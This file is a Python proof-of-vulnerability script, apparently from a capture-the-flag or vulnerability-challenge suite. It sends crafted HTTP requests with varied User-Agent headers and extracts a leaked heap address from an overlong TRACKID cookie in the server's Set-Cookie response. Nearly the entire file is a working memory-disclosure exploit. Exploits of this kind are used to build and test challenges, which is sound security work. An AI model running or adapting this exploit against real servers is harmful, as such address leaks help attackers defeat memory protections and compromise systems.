import sys
from pwn import *

def handler( signum, frame):
    print('[SUCCESs] sigalrm fired so the POV was likely successful')
    exit(0)

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, '\n')

def SW(s, data):
    #print data
    s.sendall(data)

def leak_attempt(HOST, PORT, user_agent):
    p = remote(HOST, PORT)

    data = 'GET / HTTP/1.1\r\n'
    data += 'Host: localhost:3040\r\n'
    data += 'User-Agent: %s\r\n' %(user_agent)
    data += "DNT: 1\r\n"
    data += "Accept: */*\r\n\r\n"

    p.send(data)
    print(data)

    d = p.readuntil(b'\r\n\r\n').decode('utf-8')

    print(d)
    headers = d.split('\r\n')

    for x in headers:
        h = x.split(':')

        if h[0] == 'Set-Cookie':
            attribs = h[1].split(';')

            for a in attribs:
                l = a.split('=')
                if l[0] == ' TRACKID':
                    if len(l[1]) <= 16:
                        return 0
                    else:
                        print(l)
                        leak = l[1][32:]

                        z = ''

                        for c in range(0, len(leak)//2):
                            z = leak[c*2] + leak[(c*2)+1] + z

                        print(z)

                        try:
                            hleak = int(z, 16)
                        except:
                            return 0

                        print('[ADDRSS] 0x%x' %hleak)
                        print('[SUCCESS] POV was successful')
                        exit(0)

    return 0

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    ## This is necessary because sometimes the DNT pointer might start with a NULL byte
    ##  and we need to mix up the heap buffer a bit
    for i in range(5):
        leak_attempt(HOST, PORT, 'CHESS' + 'a'*i)
    
    print('[FAIL] POV was unsuccessful')
    exit(1)

if __name__ == '__main__':
    main()
